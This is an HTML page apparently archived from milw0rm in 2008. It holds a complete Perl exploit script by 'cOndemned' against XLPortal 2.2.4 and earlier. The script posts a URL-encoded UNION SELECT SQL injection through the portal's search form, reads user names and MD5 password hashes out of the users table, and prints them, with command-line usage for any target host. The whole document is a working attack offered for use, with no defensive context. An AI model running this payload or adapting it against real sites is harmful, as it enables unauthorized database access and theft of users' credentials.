<html><head><title>XLPortal <= 2.2.4 (search) Remote SQL Injection Exploit</title></head><pre>#!D:\Perl\Bin\Perl.exe

use LWP::UserAgent;

#
#   XLPortal &lt;= 2.2.4 (search) Remote SQL Injection Exploit
#   Coded by cOndemned 
#   Greetz : irk4z, GregStar, NoRuless, Tomu, Happy B'day Avantura ;*
#

print &quot;\r\n[~] XLPortal &lt;= 2.2.4 (search) Remote SQL Injection Exploit&quot;;
print &quot;\r\n[~] Coded by cOndemned [22.03.2008]\r\n&quot;;

if (@ARGV &lt; 2) {
    print &quot;[~] Usage : $0 &lt;target_host&gt; &lt;pref&gt;\r\n&quot;;    # default pref is xlp / xlportal
    exit();
}

$head = new LWP::UserAgent;
$head-&gt;agent(&quot;Opera/9.26 (Windows NT 5.1; U; pl)&quot;);

my $request = HTTP::Request-&gt;new(POST =&gt; $ARGV[0].&quot;/index.php&quot;);


$buff = &quot;%27+union+select+1%2Cconcat%28user%2C0x3a%2Cpassword%29+from+&quot;.$ARGV[1].&quot;_users+%2F*&quot;;
$request-&gt;content_type('application/x-www-form-urlencoded');
$request-&gt;content(&quot;page=Szukaj&amp;op=Wyszukaj&amp;query=&quot;.$buff.&quot;&amp;section_News=1&amp;section_Download=1&amp;s&quot;.
                  &quot;ection_Links=1&amp;section_Articles=1&amp;exact=any&amp;sort=alpha&amp;=Rozpocznij+wyszukiw&quot;.
                  &quot;anie&quot;);
$response = $head-&gt;request($request);

if (($response-&gt;content =~ /([a-zA-Z]+?):([0-9,a-f]{32})/)) {        
    print &quot;[+] Login : $1\r\n&quot;;
    print &quot;[+] Haslo : $2\r\n&quot;;
}
else {
    print &quot;\r\n[~] This one isn't vulnerable, or bad data was given\r\n&quot;;
    exit();
}

# milw0rm.com [2008-03-21]</pre></html>